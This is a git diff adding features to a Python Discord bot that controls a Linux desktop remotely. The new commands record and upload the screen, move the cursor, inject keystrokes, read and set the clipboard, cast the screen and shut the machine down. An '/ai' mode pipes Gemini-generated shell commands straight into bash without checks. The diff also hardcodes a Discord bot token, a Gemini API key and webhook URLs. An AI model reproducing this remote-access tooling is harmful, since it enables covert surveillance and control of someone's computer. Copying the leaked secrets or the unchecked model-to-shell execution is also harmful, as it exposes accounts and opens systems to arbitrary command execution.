@@ -5,19 +5,40 @@ from typing import Dict, Any
 import sys
 import platform
 import socket
-import requests
 import discord
 import subprocess
 import asyncio
 import psutil
 import glob
-import threading  # Ensure you have this library installed using pip install psutil
+import threading
+import pyautogui
+import pyperclip
+import google.generativeai as genai
+import queue
 
 
 BUNDLES_FILE = "bundles.txt"
 
 # Bot token (replace with your actual token)
 TOKEN = "MTMyMDExNTQ2NjM0MTA2MDY3MA.GYdzJH.iDH_5vgBW4_B4BlsgmPY9ZhzClTQ7y6snc2TxI"
+
+GEMINI_API_KEY = "AIzaSyDkCWeOGVQapvdX-mlfbFkTUtZmIseY0FE"
+
+genai.configure(api_key=GEMINI_API_KEY)
+model = genai.GenerativeModel(
+    model_name="gemini-1.5-flash",
+    system_instruction=(
+        "You are an AI designed to provide Linux commands based on user prompts. "
+        "You will remember the context of previously executed commands and files that were created. "
+        "Respond only with the Linux commands that match the user's request, separated by commas. "
+        "Ensure the commands are valid and executable in sequence in the same shell session. "
+        "If the user's request is invalid or does not correspond to valid Linux commands, respond with 'echo'. "
+        "Do not include explanations, additional text, or context—only the commands themselves."
+    )
+)
+
+# Track AI sessions
+ai_sessions = {}
 
 # Discord Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1320057002033942610/7tE0LCCdk9d9LO3dejR_OO32gy8VdsynCA2tpHKmuMCRqyxcq2PiaE-dJSn2i4L_yNAu"
@@ -26,6 +47,54 @@ SHELL_URL = "https://discord.com/api/webhooks/1320059351200956507/cOhNOi697hfXNS
 
 # Setting up time
 start_time = time.time()
+
+ai_active = False
+
+class AISession:
+    def __init__(self):
+        # Set home directory
+        self.home_directory = os.path.expanduser("~")
+        
+        # Start shell in home directory
+        self.shell = subprocess.Popen(
+            "/bin/bash",
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            cwd=self.home_directory  # Set working directory to home
+        )
+        self.output_queue = queue.Queue()
+        self.command_history = []
+        
+        # Initialize by ensuring we're in home directory
+        self.shell.stdin.write(f"cd {self.home_directory}\n")
+        self.shell.stdin.flush()
+        
+        self.thread = threading.Thread(
+            target=self._read_shell_output,
+            daemon=True
+        )
+        self.thread.start()
+
+    def _read_shell_output(self):
+        while True:
+            line = self.shell.stdout.readline()
+            if line:
+                self.output_queue.put(line)
+            if self.shell.poll() is not None:
+                break
+
+    def execute_command(self, commands):
+        """Execute commands while ensuring we're in home directory"""
+        # First cd to home directory to ensure we're in the right place
+        full_commands = f"cd {self.home_directory} && {commands}"
+        self.shell.stdin.write(full_commands + "\n")
+        self.shell.stdin.flush()
+
+    def cleanup(self):
+        self.shell.terminate()
+
 
 # Intents setup
 intents = discord.Intents.default()
@@ -995,6 +1064,302 @@ async def on_message(message):
             await send_embed("Error", f"Rickrolling is unavailable.. :( Error: {error_message}", discord.Color.red())
         except Exception as e:
             await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())
+
+
+    elif message.content.startswith("/record"):
+        zparts = message.content.split(maxsplit=1)
+        if len(zparts) != 2 or not zparts[1].isdigit():
+            await send_embed("Usage", "`/record [duration in seconds]`", discord.Color.red())
+            return
+        
+        try:
+            duration = int(zparts[1])
+            if duration <= 0:
+                await send_embed("Error", "Duration must be greater than 0 seconds.", discord.Color.red())
+                return
+            
+            # Define the output file path
+            recording_path = os.path.join(current_directory, "screen_recording.mp4")
+            
+            # Record the screen using ffmpeg
+            await send_embed("🎥 Recording Screen", f"Recording for {duration} seconds...")
+            command = [
+                "ffmpeg",
+                "-video_size", "1440x900",  # Adjust resolution if needed
+                "-framerate", "30",          # Frame rate
+                "-f", "x11grab",             # Screen recording format for X11
+                "-i", os.environ.get("DISPLAY", ":0.0"),  # Display environment variable
+                "-t", str(duration),         # Duration
+                recording_path
+            ]
+            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            
+            if result.returncode != 0:
+                await send_embed("Error", f"Failed to record screen: {result.stderr}", discord.Color.red())
+                return
+            
+            # Send the recording to Discord
+            with open(recording_path, "rb") as file:
+                await message.channel.send("📹 **Screen Recording Complete:**", file=discord.File(file))
+            
+            # Remove the recording file after sending
+            os.remove(recording_path)
+        
+        except Exception as e:
+            await send_embed("Error", f"An unexpected error occurred: {str(e)}", discord.Color.red())
+
+
+    elif message.content.startswith("/cursor"):
+        parts = message.content.split()
+        
+        if len(parts) == 1:  # Show help and current cursor position
+            try:
+                cursor_position = subprocess.check_output(["xdotool", "getmouselocation"], text=True).strip()
+                position_info = "\n".join(
+                    line.split(":")[0].title() + ": " + line.split(":")[1]
+                    for line in cursor_position.split()
+                    if ":" in line
+                )
+                await send_embed("Cursor Position", f"**Current Position:**\n{position_info}\n\n"
+                                                    "**Usage:**\n"
+                                                    "`/cursor set [x] [y]` - Move cursor to the specified coordinates\n"
+                                                    "`/cursor` - Show this help and current position")
+            except Exception as e:
+                await send_embed("Error", f"Failed to get cursor position: {str(e)}", discord.Color.red())
+
+        elif len(parts) == 4 and parts[1] == "set":
+            try:
+                x, y = int(parts[2]), int(parts[3])
+                subprocess.run(["xdotool", "mousemove", str(x), str(y)], check=True)
+                await send_embed("✅ Cursor Updated", f"Moved cursor to position: (`{x}`, `{y}`)")
+            except ValueError:
+                await send_embed("Error", "Coordinates must be integers.", discord.Color.red())
+            except Exception as e:
+                await send_embed("Error", f"Failed to move cursor: {str(e)}", discord.Color.red())
+        else:
+            await send_embed("Usage", "`/cursor` to view current position or `/cursor set [x] [y]` to set position.")
+
+    elif message.content.startswith("/type"):
+        parts = message.content.split(maxsplit=1)
+        
+        if len(parts) == 1:  # No text provided
+            await send_embed(
+                "Usage: /type",
+                "**Syntax:** `/type [text or shortcuts]`\n"
+                "**Instructions:** Simulate typing the given text or shortcuts.\n"
+                "**Special keys:** Use keys like `CTRL`, `ALT`, `ENTER`, `BACKSPACE`, etc., in uppercase.\n"
+                "\n**Examples:**\n"
+                "`/type Hello, world!`\n"
+                "`/type CTRL+A`\n"
+                "`/type CTRL+C ENTER`\n"
+                "`/type BACKSPACE ALT+TAB`",
+                discord.Color.green()
+            )
+            return
+        
+        text_to_type = parts[1].strip()
+        try:
+            # Split the input into commands or text segments
+            segments = text_to_type.split(" ")
+            for segment in segments:
+                # Check if the segment is a shortcut with "+" (e.g., CTRL+A)
+                if "+" in segment:
+                    keys = segment.split("+")
+                    keys = [key.strip().lower() for key in keys]
+                    pyautogui.hotkey(*keys)
+                elif segment.upper() in ["ENTER", "BACKSPACE", "TAB", "ESC", "SHIFT", "ALT", "CTRL", "DELETE"]:
+                    pyautogui.press(segment.lower())
+                else:
+                    pyautogui.typewrite(segment + " ")
+            
+            await send_embed("✅ Typed Command", f"Executed: `{text_to_type}` successfully.")
+        except Exception as e:
+            await send_embed("Error", f"Failed to execute typing command: {str(e)}", discord.Color.red())
+
+
+    # Handle /clipboard command
+    elif message.content.startswith("/clipboard"):
+        parts = message.content.split(maxsplit=2)
+        
+        if len(parts) == 1:  # No subcommand provided
+            try:
+                clipboard_content = pyperclip.paste()
+                if clipboard_content.strip():
+                    await send_embed("📋 Clipboard Content", f"Current clipboard: `{clipboard_content}`")
+                else:
+                    await send_embed("📋 Clipboard Content", "Clipboard is currently empty.")
+            except Exception as e:
+                await send_embed("Error", f"Failed to access clipboard: {str(e)}", discord.Color.red())
+            return
+        
+        if len(parts) > 2 and parts[1] == "set":
+            clipboard_text = parts[2]
+            try:
+                pyperclip.copy(clipboard_text)
+                await send_embed("✅ Clipboard Set", f"Clipboard updated with: `{clipboard_text}`")
+            except Exception as e:
+                await send_embed("Error", f"Failed to set clipboard: {str(e)}", discord.Color.red())
+        else:
+            await send_embed("Error", "Invalid `/clipboard` command usage.", discord.Color.red())
+
+    # Handle /copy command
+    elif message.content.startswith("/copy"):
+        try:
+            pyautogui.hotkey("ctrl", "c")
+            await send_embed("✅ Copy Command", "Executed `CTRL+C` successfully.")
+        except Exception as e:
+            await send_embed("Error", f"Failed to execute copy command: {str(e)}", discord.Color.red())
+
+    # Handle /paste command
+    elif message.content.startswith("/paste"):
+        try:
+            pyautogui.hotkey("ctrl", "v")
+            await send_embed("✅ Paste Command", "Executed `CTRL+V` successfully.")
+        except Exception as e:
+            await send_embed("Error", f"Failed to execute paste command: {str(e)}", discord.Color.red())
+
+    elif message.content.strip() == "/cast":
+        if cast_process:
+            await send_embed("Error", "A cast is already running. Stop it using `/cast exit` before starting a new one.", discord.Color.red())
+            return
+
+        try:
+            # Define the casting command using ffmpeg
+            cast_command = [
+                "ffmpeg",
+                "-video_size", "1920x1080",
+                "-framerate", "30",
+                "-f", "x11grab",
+                "-i", os.getenv("DISPLAY", ":0"),
+                "-f", "mpegts",
+                "udp://127.0.0.1:12345"
+            ]
+
+            # Start the casting process
+            cast_process = subprocess.Popen(cast_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            await send_embed("🎥 Casting Started", "The screen is now being cast. Use `/cast exit` to stop.")
+        except Exception as e:
+            await send_embed("Error", f"Failed to start screen casting: {str(e)}", discord.Color.red())
+
+    # /cast exit command to stop screen casting
+    elif message.content.strip() == "/cast exit":
+        if not cast_process:
+            await send_embed("Error", "No cast is currently running.", discord.Color.red())
+            return
+
+        try:
+            # Terminate the casting process
+            cast_process.terminate()
+            cast_process.wait()
+            cast_process = None
+            await send_embed("🎥 Casting Stopped", "The screen casting has been stopped.")
+        except Exception as e:
+            await send_embed("Error", f"Failed to stop screen casting: {str(e)}", discord.Color.red())
+
+
+    elif message.content.strip() == "/shutdown":
+        await send_embed("Shutting down..")
+        try:
+            result = subprocess.run(["shutdown", "now"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            if result.returncode == 0:
+                await send_embed("Error", f"✅ Succesfully shut down!\n`Bot will disconnect shortly.`", discord.Color.orange())
+            else:
+                error_message = result.stderr or "Unknown error occurred."
+                await send_embed("Error", f"Failed to launch Visual Studio Code:\n`{error_message}`", discord.Color.red())
+        except FileNotFoundError:
+            await send_embed("Error", "Shutting down is not available or the `shutdown` command is unavailable.", discord.Color.red())
+        except Exception as e:
+            await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())
+
+
+    if message.content.startswith("/ai"):
+        parts = message.content.split()
+        action = parts[1] if len(parts) > 1 else "help"
+
+        if action == "help" or len(parts) == 1:
+            await send_embed("AI Command Helper", """
+**Usage:**
+`/ai start` - Start an AI session
+`/ai stop` - Stop the AI session
+
+After starting a session, simply type your commands in plain English!
+
+**Example:**
+1. `/ai start`
+2. Type: 'create a directory called projects and make a file called readme.txt inside it'
+3. AI will execute: `mkdir projects && cd projects && touch readme.txt`
+""")
+            return
+
+        elif action == "start":
+            if message.author.id in ai_sessions:
+                await send_embed("Error", "You already have an active AI session! Use `/ai stop` to end it first.", discord.Color.red())
+                return
+
+            ai_sessions[message.author.id] = AISession()
+            await send_embed("✅ AI Session Started", "You can now type your commands in plain English.")
+
+        elif action == "stop":
+            if message.author.id not in ai_sessions:
+                await send_embed("Error", "You don't have an active AI session!", discord.Color.red())
+                return
+
+            ai_sessions[message.author.id].cleanup()
+            del ai_sessions[message.author.id]
+            await send_embed("✅ AI Session Stopped", "AI session has been terminated.")
+
+    # Handle AI session messages
+    elif message.author.id in ai_sessions and not message.content.startswith(("/", "cmd:")):
+        session = ai_sessions[message.author.id]
+        
+        # Generate AI response
+        full_prompt = (
+            "Command history:\n" +
+            "\n".join(session.command_history) +
+            "\nUser request: " + message.content
+        )
+        
+        response = model.generate_content(full_prompt)
+        commands = response.text.strip().replace(",", ";")
+
+        if commands == "echo":
+            await send_embed("Error", "Could not convert your request into valid Linux commands.", discord.Color.red())
+            return
+
+        try:
+            # Execute commands
+            session.shell.stdin.write(commands + "\n")
+            session.shell.stdin.flush()
+
+            # Get output
+            output = []
+            await asyncio.sleep(0.5)  # Give some time for output to arrive
+            while not session.output_queue.empty():
+                output.append(session.output_queue.get())
+
+            # Save to history
+            session.command_history.append(f"User: {message.content}\nAI: {commands}")
+
+            # Create response embed
+            embed = discord.Embed(title="AI Command Execution", color=discord.Color.green())
+            embed.add_field(
+                name="Commands Executed",
+                value=f"```bash\n{commands}\n```",
+                inline=False
+            )
+            if output:
+                embed.add_field(
+                    name="Output",
+                    value=f"```\n{''.join(output)}\n```",
+                    inline=False
+                )
+
+            await message.reply(embed=embed)
+
+        except Exception as e:
+            await send_embed("Error", f"An error occurred while executing the commands: {str(e)}", discord.Color.red())
+
+
 
 # Daemonize the script (optional)
 def daemonize():
